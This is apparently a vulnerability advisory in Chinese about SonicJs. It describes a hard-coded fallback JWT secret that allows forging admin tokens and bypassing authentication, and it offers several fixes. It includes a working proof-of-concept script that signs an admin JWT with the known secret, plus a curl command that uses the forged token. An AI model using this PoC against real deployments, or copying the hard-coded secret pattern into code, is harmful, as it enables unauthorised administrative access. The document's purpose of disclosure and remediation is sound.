# SONIC-2025-003: JWT Fallback Secret 硬编码导致认证绕过

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [SonicJs-Org/sonicjs](https://github.com/SonicJs-Org/sonicjs) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/条件依赖 |

## 漏洞概述

SonicJs 在 JWT 签名和 CSRF token 签名中使用了一个公开的硬编码 fallback secret。当部署者没有通过 Cloudflare Workers 的 `wrangler secret` 设置 `JWT_SECRET` 环境变量时（这在快速部署、demo、或配置遗漏的场景中很常见），所有 JWT token 都将使用这个公开已知的 secret 签名。

攻击者可以利用这个已知 secret 自行构造合法的 admin JWT，完全绕过认证。

## 漏洞代码

**文件**: `packages/core/src/middleware/auth.ts` (第12行)

```typescript
// Fallback JWT secret for local development only (no wrangler secret set)
const JWT_SECRET_FALLBACK = 'your-super-secret-jwt-key-change-in-production'
```

**使用位置** (第173行 `generateToken`):
```typescript
static async generateToken(userId, email, role, secret?, expiresInSeconds?) {
  // ...
  return await sign(payload, secret || JWT_SECRET_FALLBACK, 'HS256')
  //                                   ^^^^^^^^^^^^^^^^^^^^^^^^
  //                                   如果 c.env.JWT_SECRET 未设置，使用 fallback
}
```

**使用位置** (第207行 `verifyToken`):
```typescript
static async verifyToken(token, secret?, graceSeconds = 0) {
  const effectiveSecret = secret || JWT_SECRET_FALLBACK
  // ...
  payload = await verify(token, effectiveSecret, 'HS256')
}
```

**同样的 fallback 也用于 CSRF**:

**文件**: `packages/core/src/middleware/csrf.ts` (第18行)
```typescript
const JWT_SECRET_FALLBACK = 'your-super-secret-jwt-key-change-in-production'
```

## 条件

此漏洞在以下情况下可被利用：
1. 部署者没有设置 `JWT_SECRET` wrangler secret（`wrangler secret put JWT_SECRET`）
2. 或者 `c.env.JWT_SECRET` 为 undefined/空值

根据代码注释和文档，这是一个容易被忽略的配置步骤。

## PoC (概念验证)

```javascript
// 攻击者用已知 secret 构造 admin JWT
const jose = require('jose')

const secret = new TextEncoder().encode('your-super-secret-jwt-key-change-in-production')

const token = await new jose.SignJWT({
  userId: 'admin-user-id',
  email: 'admin@sonicjs.com',
  role: 'admin',
  exp: Math.floor(Date.now() / 1000) + 86400,
  iat: Math.floor(Date.now() / 1000)
})
  .setProtectedHeader({ alg: 'HS256' })
  .sign(secret)

console.log('Forged admin token:', token)
```

```bash
# 使用伪造的 token 访问 admin
curl -H "Authorization: Bearer <forged-token>" \
  https://target.workers.dev/admin/dashboard
```

## 修复建议

### 方案1（推荐）：启动时强制检查

```typescript
// 在应用初始化时，如果 JWT_SECRET 未设置则拒绝启动
export function validateJwtSecret(env: Record<string, any>): void {
  if (!env.JWT_SECRET || env.JWT_SECRET === JWT_SECRET_FALLBACK) {
    if (env.ENVIRONMENT === 'production') {
      throw new Error(
        'FATAL: JWT_SECRET is not configured. ' +
        'Run: wrangler secret put JWT_SECRET'
      )
    }
    console.warn(
      '⚠️  WARNING: Using fallback JWT secret. ' +
      'This is insecure for any non-local deployment.'
    )
  }
}
```

### 方案2：移除 fallback，强制要求配置

```typescript
static async generateToken(userId, email, role, secret?, expiresInSeconds?) {
  if (!secret) {
    throw new Error('JWT_SECRET is required. Set it via: wrangler secret put JWT_SECRET')
  }
  // ...
}
```

### 方案3：随机生成 fallback（每次部署不同）

```typescript
// 至少让每个实例的 fallback 不同
const JWT_SECRET_FALLBACK = crypto.randomUUID() // 重启后失效但至少不可预测
```

## 参考

- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [OWASP: Use of Hard-coded Password](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)
- [Cloudflare Workers Secrets](https://developers.cloudflare.com/workers/configuration/secrets/)
